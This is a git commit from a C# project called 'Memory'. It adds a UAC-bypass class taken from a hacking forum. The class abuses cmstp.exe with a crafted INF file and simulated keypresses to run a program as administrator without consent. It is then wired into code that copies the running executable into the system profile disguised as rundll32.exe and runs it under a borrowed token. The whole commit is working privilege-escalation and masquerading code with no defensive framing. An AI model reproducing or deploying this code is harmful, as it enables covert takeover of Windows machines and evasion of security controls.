90d475918aff1fccebdd0fb0f47749230e25d8b5
mbwilding <mbwilding@gmail.com>
2021-09-15 18:40:04 +0800

    Elevate added

---
+++ Memory/Classes/Elevate.cs
@@ -0,0 +1,104 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Memory
+{
+    /// <summary>
+    /// Created by gigajew based off of existing UAC bypass, extended functionality
+    /// to run apps as administrator
+    ///
+    /// 09/18/2019 for www.hackforums.net
+    ///
+    /// Bitcoin donations very welcome: 12FP1JisjYCsgfteTLMQQMLNVBs65wZD8G
+    /// </summary>
+    /// <usage>
+    /// Task.Run(() => Bypass.TryRun("c:\\windows\\system32\\cmd.exe") ).Wait( );
+    /// </usage>
+    /// <requirements>
+    /// .NET 4.5 or later for async tasks
+    /// </requirements>
+    public static class Bypass
+    {
+        private const string user32 = "user32.dll";
+
+        [DllImport(user32)]
+        private static extern bool SetForegroundWindow(IntPtr hwnd);
+
+        [DllImport(user32)]
+        private static extern bool ShowWindow(IntPtr hwnd, int cmdShow);
+
+        [DllImport(user32)]
+        private static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
+
+        private const int VK_RETURN = 0x0D;
+        private const int WM_KEYDOWN = 0x100;
+
+        // increase this on slow/laggy pcs perhaps
+        public static int Timeout { get; set; } = 100;
+
+        public static async Task TryRun(string filename)
+        {
+            try { await Run(filename); }
+            catch (Exception e)
+            {
+                Debug.WriteLine(e.Message);
+            }
+        }
+        public static async Task Run(string filename)
+        {
+            DirectoryInfo temporary_folder = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"));
+            if (!temporary_folder.Exists)
+                temporary_folder.Create();
+
+            FileInfo settings_file = new FileInfo(Path.Combine(temporary_folder.FullName, "CMSTP.inf"));
+            string ini = $@"
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+powershell.exe ""Start-Process {filename} -Verb RunAs""
+taskkill /IM cmstp.exe /F
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+[Strings]
+ServiceName=""gigajew""
+ShortSvcName=""gigajew""
+";
+            using (FileStream fs = settings_file.Create())
+            {
+                using (BinaryWriter wr = new BinaryWriter(fs, Encoding.ASCII))
+                {
+                    wr.Write(ini);
+                    await fs.FlushAsync();
+                }
+            }
+            using (Process p = new Process())
+            {
+                p.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
+                p.StartInfo.Arguments = string.Format("/au \"{0}\"", settings_file.FullName);
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.CreateNoWindow = true;
+                p.Start();
+                while (p.MainWindowHandle == IntPtr.Zero)
+                {
+                    await Task.Delay(Timeout);
+                }
+                if (SetForegroundWindow(p.MainWindowHandle) && ShowWindow(p.MainWindowHandle, 5))
+                {
+                    await Task.Delay(Timeout);
+                    PostMessage(p.MainWindowHandle, WM_KEYDOWN, VK_RETURN, 0);
+                }
+            }
+        }
+    }
+}
--- Memory/Classes/Randomizer.cs
+++ Memory/Classes/Randomizer.cs
@@ -3,6 +3,8 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Threading.Tasks;
 
 // REQUIRES PUBLISHING TO SINGLE FILE
 
@@ -28,6 +30,11 @@ namespace Memory
             {
                 string currentPath = process.MainModule.FileName;
                 const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
+                if (!IsAdministrator())
+                {
+                    Task.Run(() => Bypass.TryRun(currentPath)).Wait();
+                    Environment.Exit(0);
+                }
                 if (File.Exists(finalPath)) File.Delete(finalPath);
                 if (currentPath != null) File.Copy(currentPath, finalPath);
                 Sudoku.RunWithTokenOf(
@@ -60,6 +67,12 @@ namespace Memory
             const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
             return new string(Enumerable.Repeat(chars, length)
                 .Select(s => s[Rand.Next(s.Length)]).ToArray());
+        }
+
+        public static bool IsAdministrator()
+        {
+            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
+                .IsInRole(WindowsBuiltInRole.Administrator);
         }
     }
 }
